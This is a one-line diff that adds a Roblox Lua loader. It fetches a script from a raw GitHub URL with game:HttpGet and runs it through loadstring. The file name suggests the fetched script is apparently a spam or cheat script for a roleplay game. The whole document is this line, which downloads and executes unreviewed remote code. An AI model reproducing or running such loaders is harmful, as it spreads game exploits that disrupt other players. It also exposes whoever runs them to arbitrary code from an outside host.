@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vortexorbimagine/loaders/main/loaders/lifetogether-rp-spam5-k75ovjkskrtlcz.lua"))()
